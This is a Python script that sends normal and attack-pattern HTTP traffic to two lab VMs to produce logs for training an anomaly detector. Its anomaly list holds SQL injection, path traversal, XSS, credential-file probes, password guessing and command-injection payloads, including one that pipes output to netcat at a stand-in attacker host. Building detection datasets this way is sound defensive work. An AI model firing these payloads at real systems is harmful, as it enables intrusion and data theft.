"""
Traffic Generator - Generates realistic traffic to two VM servers to produce logs.
Runs on the host machine (Windows) or any machine on the network.

VM1: Bootstrap Landing Page - http://VM1_IP:8080
VM2: React Landing Page     - http://VM2_IP:3000

This script continuously sends HTTP requests with realistic patterns:
- Browse pages/sections of the Bootstrap Landing Page (intro-page behavior)
- Browse pages of the React Landing Page (SPA navigation)
- Health checks (monitoring-style traffic)

How to run:
    pip install requests
    python traffic_generator.py
"""

import requests
import time
import random
import threading
from datetime import datetime

# ============ CONFIGURATION ============
VM1_BOOTSTRAP = "http://192.168.31.129:8080"   # Prod-BootstrapLP (Bootstrap Landing Page) - NAT mode
VM2_REACT = "http://192.168.31.130:3000"        # Prod-ReactLP (React Landing Page)

# Traffic generation rate (requests/minute per server)
# Each server: 30 normal + 30 anomaly = 60 total req/min (50:50 ratio)
REQUESTS_PER_MINUTE = 30  # Normal traffic
ANOMALY_REQUESTS_PER_MINUTE = 30  # Anomaly traffic (50% of total)
# ============ END CONFIGURATION ============

# User-Agent list simulating multiple client types
USER_AGENTS = [
    # Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    # Monitoring tools (like Prod-VideoPortal log sample)
    "Monit/5.30.0",
    "Monit/5.30.0",
    # CLI / Scripts
    "curl/7.81.0",
    "python-requests/2.31.0",
    # Crawlers/Bots
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
]

# ============================================================
# BOOTSTRAP LANDING PAGE ROUTES (VM1)
# Static HTML site - simulates user browsing landing page
# ============================================================
BOOTSTRAP_ROUTES = [
    # Main pages
    {"method": "GET", "path": "/", "weight": 20, "desc": "Landing Page Home"},
    {"method": "GET", "path": "/index.html", "weight": 10, "desc": "Index (direct)"},
    # CSS assets
    {"method": "GET", "path": "/css/styles.css", "weight": 12, "desc": "Main stylesheet"},
    # JS assets
    {"method": "GET", "path": "/js/scripts.js", "weight": 10, "desc": "Main JavaScript"},
    # Images / media — Bootstrap landing page hero images
    {"method": "GET", "path": "/assets/img/bg-masthead.jpg", "weight": 8, "desc": "Hero masthead image"},
    {"method": "GET", "path": "/assets/img/bg-showcase-1.jpg", "weight": 6, "desc": "Showcase image 1"},
    {"method": "GET", "path": "/assets/img/bg-showcase-2.jpg", "weight": 6, "desc": "Showcase image 2"},
    {"method": "GET", "path": "/assets/img/bg-showcase-3.jpg", "weight": 6, "desc": "Showcase image 3"},
    # Favicon and meta
    {"method": "GET", "path": "/favicon.ico", "weight": 8, "desc": "Favicon"},
    # Bootstrap CDN resources (browser will request, but we also test local fallback)
    {"method": "GET", "path": "/assets/favicon.ico", "weight": 3, "desc": "Assets favicon"},
    # Anchor navigation (SPA-like scroll, server still returns index.html)
    {"method": "GET", "path": "/#features", "weight": 5, "desc": "Section Features"},
    {"method": "GET", "path": "/#testimonials", "weight": 5, "desc": "Section Testimonials"},
    {"method": "GET", "path": "/#signup", "weight": 5, "desc": "Section Signup"},
    # Errors - non-existent requests
    {"method": "GET", "path": "/admin", "weight": 2, "desc": "404 admin probe"},
    {"method": "GET", "path": "/wp-login.php", "weight": 2, "desc": "404 WordPress probe (bot scan)"},
    {"method": "GET", "path": "/.env", "weight": 1, "desc": "403 env probe (security scan)"},
    {"method": "GET", "path": "/api/v1/config", "weight": 1, "desc": "404 API probe"},
    {"method": "GET", "path": "/nonexistent-page", "weight": 2, "desc": "404 random page"},
    {"method": "GET", "path": "/robots.txt", "weight": 3, "desc": "Robots.txt"},
    {"method": "GET", "path": "/sitemap.xml", "weight": 2, "desc": "Sitemap (may 404)"},
]

# ============================================================
# REACT LANDING PAGE ROUTES (VM2)
# React SPA (Single Page App) - simulates user navigating SPA
# ============================================================
REACT_ROUTES = [
    # Main entry
    {"method": "GET", "path": "/", "weight": 20, "desc": "React App Home"},
    {"method": "GET", "path": "/index.html", "weight": 5, "desc": "Index (direct)"},
    # React Router pages (SPA - server returns index.html for all routes)
    {"method": "GET", "path": "/home", "weight": 10, "desc": "Home route"},
    {"method": "GET", "path": "/about", "weight": 8, "desc": "About page"},
    {"method": "GET", "path": "/services", "weight": 8, "desc": "Services page"},
    {"method": "GET", "path": "/contact", "weight": 6, "desc": "Contact page"},
    {"method": "GET", "path": "/portfolio", "weight": 6, "desc": "Portfolio page"},
    {"method": "GET", "path": "/pricing", "weight": 5, "desc": "Pricing page"},
    # Static assets (CRA build output)
    {"method": "GET", "path": "/static/css/main.css", "weight": 10, "desc": "Main CSS bundle"},
    {"method": "GET", "path": "/static/js/main.js", "weight": 10, "desc": "Main JS bundle"},
    {"method": "GET", "path": "/static/js/chunk.js", "weight": 5, "desc": "JS chunk"},
    {"method": "GET", "path": "/static/media/logo.svg", "weight": 4, "desc": "Logo SVG"},
    {"method": "GET", "path": "/manifest.json", "weight": 5, "desc": "PWA manifest"},
    {"method": "GET", "path": "/favicon.ico", "weight": 8, "desc": "Favicon"},
    {"method": "GET", "path": "/logo192.png", "weight": 3, "desc": "PWA icon 192"},
    {"method": "GET", "path": "/logo512.png", "weight": 2, "desc": "PWA icon 512"},
    # Errors - probe requests
    {"method": "GET", "path": "/admin", "weight": 2, "desc": "404 admin probe"},
    {"method": "GET", "path": "/wp-login.php", "weight": 2, "desc": "404 WordPress probe (bot scan)"},
    {"method": "GET", "path": "/.env", "weight": 1, "desc": "403 env probe (security scan)"},
    {"method": "GET", "path": "/api/users", "weight": 2, "desc": "404 API probe"},
    {"method": "GET", "path": "/nonexistent-page", "weight": 2, "desc": "404 random page"},
    {"method": "GET", "path": "/robots.txt", "weight": 3, "desc": "Robots.txt"},
    {"method": "GET", "path": "/sitemap.xml", "weight": 2, "desc": "Sitemap (may 404)"},
]

# ============================================================
# ANOMALY PATTERNS - Generate abnormal logs for AI training
# ============================================================
ANOMALY_PATTERNS = [
    # SQL Injection attempts
    {"method": "GET", "path": "/search?q=' OR '1'='1", "weight": 3, "desc": "🔴 SQL Injection - Always True"},
    {"method": "GET", "path": "/user?id=1' UNION SELECT * FROM users--", "weight": 2, "desc": "🔴 SQL Injection - UNION"},
    {"method": "GET", "path": "/login?user=admin'--", "weight": 2, "desc": "🔴 SQL Injection - Comment Out"},
    {"method": "GET", "path": "/api/data?filter=1; DROP TABLE users;--", "weight": 1, "desc": "🔴 SQL Injection - DROP TABLE"},
    
    # Path Traversal / Directory Traversal
    {"method": "GET", "path": "/../../../etc/passwd", "weight": 3, "desc": "🔴 Path Traversal - /etc/passwd"},
    {"method": "GET", "path": "/../../windows/system32/config/sam", "weight": 2, "desc": "🔴 Path Traversal - Windows SAM"},
    {"method": "GET", "path": "/files/....//....//....//etc/shadow", "weight": 2, "desc": "🔴 Path Traversal - Encoded"},
    
    # XSS (Cross-Site Scripting) attempts
    {"method": "GET", "path": "/search?q=<script>alert('XSS')</script>", "weight": 3, "desc": "🔴 XSS - Basic"},
    {"method": "GET", "path": "/comment?text=<img src=x onerror=alert(1)>", "weight": 2, "desc": "🔴 XSS - Image Error"},
    {"method": "GET", "path": "/profile?name=<iframe src=javascript:alert('XSS')>", "weight": 2, "desc": "🔴 XSS - IFrame"},
    
    # Sensitive File/Config Access attempts
    {"method": "GET", "path": "/.git/config", "weight": 2, "desc": "🔴 Sensitive - Git Config"},
    {"method": "GET", "path": "/.aws/credentials", "weight": 2, "desc": "🔴 Sensitive - AWS Creds"},
    {"method": "GET", "path": "/config/database.yml", "weight": 2, "desc": "🔴 Sensitive - DB Config"},
    {"method": "GET", "path": "/backup.sql", "weight": 2, "desc": "🔴 Sensitive - SQL Backup"},
    {"method": "GET", "path": "/phpinfo.php", "weight": 2, "desc": "🔴 Sensitive - PHP Info"},
    
    # Admin/Auth Brute Force patterns
    {"method": "POST", "path": "/admin/login", "json": {"username": "admin", "password": "123456"}, "weight": 4, "desc": "🔴 Brute Force - Admin"},
    {"method": "POST", "path": "/admin/login", "json": {"username": "root", "password": "password"}, "weight": 3, "desc": "🔴 Brute Force - Root"},
    {"method": "GET", "path": "/administrator", "weight": 2, "desc": "🔴 Admin Probe"},
    {"method": "GET", "path": "/phpmyadmin", "weight": 2, "desc": "🔴 PhpMyAdmin Probe"},
    {"method": "GET", "path": "/cpanel", "weight": 2, "desc": "🔴 cPanel Probe"},
    
    # Command Injection attempts
    {"method": "GET", "path": "/ping?host=8.8.8.8; cat /etc/passwd", "weight": 2, "desc": "🔴 Command Injection"},
    {"method": "GET", "path": "/system?cmd=ls -la | nc attacker.com 4444", "weight": 1, "desc": "🔴 Command Injection - Netcat"},
    
    # Unusual/Suspicious Patterns
    {"method": "GET", "path": "/cgi-bin/test.cgi", "weight": 2, "desc": "🔴 CGI Exploit Attempt"},
    {"method": "GET", "path": "/shell.php", "weight": 2, "desc": "🔴 Web Shell Probe"},
    {"method": "GET", "path": "/upload.php", "weight": 2, "desc": "🔴 Upload Script Probe"},
    {"method": "GET", "path": "/.svn/entries", "weight": 1, "desc": "🔴 SVN Info Leak"},
    
    # Rapid fire same path (rate abuse)
    {"method": "GET", "path": "/api/expensive-operation", "weight": 3, "desc": "🔴 Rate Abuse"},
]


def weighted_choice(routes):
    """Randomly select a route by weight."""
    total = sum(r["weight"] for r in routes)
    r = random.uniform(0, total)
    cumulative = 0
    for route in routes:
        cumulative += route["weight"]
        if r <= cumulative:
            return route
    return routes[0]


def send_request(base_url: str, route: dict, server_name: str, session=None):
    """Send one HTTP request to the server."""
    url = f"{base_url}{route['path']}"
    method = route["method"]
    ua = random.choice(USER_AGENTS)

    headers = {"User-Agent": ua}
    requester = session if session else requests

    try:
        if method == "GET":
            resp = requester.get(url, headers=headers, timeout=10, allow_redirects=True)
        elif method == "POST":
            json_data = route.get("json", {})
            resp = requester.post(url, json=json_data, headers=headers, timeout=10, allow_redirects=True)
        else:
            return

        timestamp = datetime.now().strftime("%H:%M:%S")
        status = resp.status_code
        desc = route.get("desc", route["path"])
        symbol = "+" if status < 400 else "x"
        print(f"  [{timestamp}] {symbol} {server_name}: {method} {route['path']} -> {status} ({desc})")
        return status

    except requests.exceptions.ConnectionError:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"  [{timestamp}] x {server_name}: Connection refused - {url}")
        return None
    except Exception as e:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"  [{timestamp}] x {server_name}: {e}")
        return None


def health_check_loop(base_url: str, path: str, server_name: str):
    """
    Simulate Monit health checks: send a GET request every ~50 seconds
    (similar to the pattern in the Prod-VideoPortal log sample).
    """
    while True:
        try:
            headers = {"User-Agent": "Monit/5.30.0"}
            resp = requests.get(f"{base_url}{path}", headers=headers, timeout=10, allow_redirects=True)
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"  [{timestamp}] ♥ {server_name}: Health check {path} -> {resp.status_code}")
        except Exception:
            pass
        time.sleep(random.uniform(45, 55))  # ~50s like sample


def traffic_loop(base_url: str, routes: list, server_name: str, session=None):
    """Main traffic generation loop for one server."""
    while True:
        route = weighted_choice(routes)
        send_request(base_url, route, server_name, session)

        # Random delay between requests
        delay = 60.0 / REQUESTS_PER_MINUTE
        time.sleep(random.uniform(delay * 0.5, delay * 1.5))


def anomaly_attack_loop(targets: list):
    """
    Send abnormal attack patterns.
    Frequency: 50% of total traffic (balanced dataset for AI training).
    Each target receives an equal share of anomaly requests.
    """
    while True:
        # Select a random target.
        base_url, server_name = random.choice(targets)
        
        # Select an attack pattern.
        attack = weighted_choice(ANOMALY_PATTERNS)
        
        # Send attack.
        send_request(base_url, attack, server_name)
        
        # Delay: 30 anomaly/min for BOTH servers = each server ~15 req/min
        # Increase to 60 total to ensure 30/server.
        delay = 60.0 / (ANOMALY_REQUESTS_PER_MINUTE * 2)  # x2 because 2 servers
        time.sleep(random.uniform(delay * 0.8, delay * 1.2))


def main():
    print("=" * 60)
    print("  TRAFFIC GENERATOR - Bootstrap LP + React LP")
    print("=" * 60)
    print()
    print(f"  VM1 (Bootstrap LP):  {VM1_BOOTSTRAP}")
    print(f"  VM2 (React LP):      {VM2_REACT}")
    print(f"  Target: ~{REQUESTS_PER_MINUTE} requests/min per server")
    print()

    # Check connectivity
    print("[1] Checking connection to servers...")
    for name, url, path in [
        ("Bootstrap LP", VM1_BOOTSTRAP, "/"),
        ("React LP", VM2_REACT, "/")
    ]:
        try:
            resp = requests.get(f"{url}{path}", timeout=5, allow_redirects=True)
            print(f"  + {name}: OK (status {resp.status_code})")
        except Exception as e:
            print(f"  x {name}: CANNOT CONNECT - {e}")
            print("    Ensure the VM is running and the app is deployed.")

    print()
    print("[2] Starting traffic generation... (Ctrl+C to stop)")
    print(f"    Normal traffic: ~{REQUESTS_PER_MINUTE} req/min/server")
    print(f"    🔴 Anomaly attacks: ~{ANOMALY_REQUESTS_PER_MINUTE} req/min/server")
    print(f"    Anomaly:Normal ratio = 50:50 (balanced dataset)")
    print("-" * 60)

    # Target list for anomaly attacks
    targets = [
        (VM1_BOOTSTRAP, "BootstrapLP"),
        (VM2_REACT, "ReactLP")
    ]

    # Run threads in parallel
    threads = [
        # Main traffic for Bootstrap Landing Page
        threading.Thread(
            target=traffic_loop,
            args=(VM1_BOOTSTRAP, BOOTSTRAP_ROUTES, "BootstrapLP"),
            daemon=True
        ),
        # Main traffic for React Landing Page
        threading.Thread(
            target=traffic_loop,
            args=(VM2_REACT, REACT_ROUTES, "ReactLP"),
            daemon=True
        ),
        # Health check for Bootstrap LP (like Monit in sample)
        threading.Thread(
            target=health_check_loop,
            args=(VM1_BOOTSTRAP, "/", "BootstrapLP"),
            daemon=True
        ),
        # Health check for React LP
        threading.Thread(
            target=health_check_loop,
            args=(VM2_REACT, "/", "ReactLP"),
            daemon=True
        ),
        # 🔴 ANOMALY ATTACK THREAD - send attack patterns
        threading.Thread(
            target=anomaly_attack_loop,
            args=(targets,),
            daemon=True
        ),
    ]

    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print("Traffic generator stopped.")


if __name__ == "__main__":
    main()
